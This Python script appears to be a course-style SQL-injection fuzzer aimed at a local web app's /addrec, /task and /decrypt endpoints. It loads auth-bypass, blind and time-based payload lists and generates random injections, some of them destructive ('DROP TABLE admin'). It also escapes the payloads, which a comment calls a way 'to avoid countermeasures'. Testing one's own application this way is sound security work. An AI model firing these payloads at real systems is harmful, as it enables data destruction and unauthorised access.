#!/usr/bin/env python3
from random import random

import requests        # for sending/receiving web requests
import sys             # various system routines (exit, access to stdin, stderr, etc.)
import itertools       # simple tools for computing, e.g., the cross-product of lists
import time
from enum import Enum  # for defining enumerations

class PayloadType(Enum):
    INTEGER    = 1 # fuzz with a pre-configured list of SQL payloads
    STRING     = 2 # fuzz with dynamically generated XSS payloads (mutations) 
    SQL        = 3 #



root_url = "http://127.0.0.1:5000/"

endpoints = [
    {
        "url": "/addrec",
        "method": "POST",
        "param_data": {
            "title": [PayloadType.STRING],
            "password": [PayloadType.SQL],
            "body": [PayloadType.STRING]
        }
    },
    {
        "url": "/addrec",
        "method": "POST",
        "param_data": {
            "title": [PayloadType.SQL],
            "password": [PayloadType.STRING],
            "body": [PayloadType.STRING]
        }
    },
    {
        "url": "/addrec",
        "method": "POST",
        "param_data": {
            "title": [PayloadType.STRING],
            "password": [PayloadType.STRING],
            "body": [PayloadType.SQL]
        }
    },
    {
        "url": "/task",
        "method": "GET",
        "param_data": {
            "id": [PayloadType.INTEGER]
        }
    },
    {
        "url": "/task",
        "method": "GET",
        "param_data": {
            "id": [PayloadType.SQL]
        }
    },
    {
        "url": "/decrypt",
        "method": "POST",
        "param_data": {
            "id": [PayloadType.SQL],
            "password": [PayloadType.INTEGER]
        }
    },
    {
        "url": "/decrypt",
        "method": "POST",
        "param_data": {
            "id": [PayloadType.INTEGER],
            "password": [PayloadType.SQL]
        }
    }
]



def get_mutated_sql_payload():
    # TODO: write a method that, using one or multiple lists
    #       of initial SQL payloads, generated new payloads 
    #       using an SQL-specific generation or mutation strategy
    from html import escape
    import random


    # Add two lists with txt file
    # To use complete list use: Auth_Bypass, GenericBlind, Generic_TimeBased
    with open('Auth_Bypass2.txt') as f:
        lines = [line for line in f]
    # removing the new line characters
    with open('Auth_Bypass2.txt') as f:
        attacksAuth = [line.rstrip() for line in f]

    with open('GenericBlind2.txt') as f:
        lines2 = [line for line in f]
    # removing the new line characters
    with open('GenericBlind2.txt') as f:
        attacksBlind = [line.rstrip() for line in f]

    with open('Generic_TimeBased2.txt') as f:
        lines = [line for line in f]
    # removing the new line characters
    with open('Generic_TimeBased2.txt') as f:
        attacksTime = [line.rstrip() for line in f]

    # SQL like operations
    sql_operator = [" OR ", " AND "]
    sql_attack = ["DROP TABLE "]
    sql_select = ["SELECT * FROM "]
    sql_where = ["WHERE "]
    sql_names = ["admin ","notes ","db ","database "]
    sql_constants = ["1","2","3","?"]
    sql_stop = [";"]

    # Creation of random payloads using the TXT files and SQL operations
    randomAttacks = []
    numberRandomPayloads = 10
    for o in range(numberRandomPayloads):
        rand = random.randint(0,len(sql_attack)-1)
        rand2 = random.randint(0, len(sql_names)-1)
        rand3 = random.randint(0, len(sql_operator)-1)
        rand4 = random.randint(0, len(attacksAuth) - 1)
        rand5 = random.randint(0, len(sql_select) - 1)
        rand6 = random.randint(0, len(sql_where) - 1)
        rand7 = random.randint(0, len(sql_stop) - 1)
        rand8 = random.randint(0, len(sql_constants) - 1)
        randomAttacks.append(sql_attack[rand] + sql_names[rand2])
        randomAttacks.append(sql_select[rand5] + sql_names[rand2] + sql_where[rand6] + sql_constants[rand8] + sql_operator[rand3] + attacksAuth[rand4])
        randomAttacks.append(sql_select[rand5] + sql_names[rand2] + sql_stop[rand7] + sql_attack[rand] + sql_names[rand2])

    # Add all the attacks to the same list
    attacksDB = []
    [attacksDB.extend(l) for l in (randomAttacks, attacksAuth,attacksTime,attacksBlind)]

    # Transform usual forbidden items into HTML entities to avoid countermeasures
    attacksEscaped = []
    for i in attacksDB:
        attacksEscaped.append(escape(i))

    #Send Attacks
    for a in attacksEscaped:
        print('ATTACK USED', a)
        yield a

def iterate_payloads(d):
    l = []
    for parameter, payload_placeholders in d.items():
        for payload_placeholder in payload_placeholders:
            if payload_placeholder == PayloadType.SQL:
                payloads = get_mutated_sql_payload()
            elif payload_placeholder == PayloadType.INTEGER:
                payloads = [1] # for fields requiring an integer
            elif payload_placeholder == PayloadType.STRING:
                payloads = ["A"] # for field requiring a string
            else:
                raise Exception(f"Unknown payload substitution: {payload_placeholder}")
        l.append([(parameter, payload) for payload in payloads])
    for payload in itertools.product(*l):
        yield dict(payload)


def main():
    print(f"Starting fuzzer for site {root_url}...")
    for endpoint in endpoints:
        session = requests.Session()

        payloads = list(iterate_payloads(endpoint["param_data"]))

        print(f"* Fuzzing endpoint {endpoint['url']} with {len(payloads)} parameter payload(s) ")
        for payload in payloads:
            time.sleep(2)
            try:
                if endpoint["method"] == 'POST':
                    r = session.post(root_url + endpoint["url"], data=payload, timeout=2)
                else:     
                    r = session.get(root_url + endpoint["url"], params=payload, timeout=2)
                if r.status_code == requests.codes.server_error:
                    print(f"  Found possible SQL Injection (got server error: {r.status_code}) for payload {str(payload)} ")
            except requests.exceptions.ReadTimeout:
                print(f"  Found possible SQL Injection (got timeout) for payload {str(payload)} ")


if __name__ == "__main__":
    main()
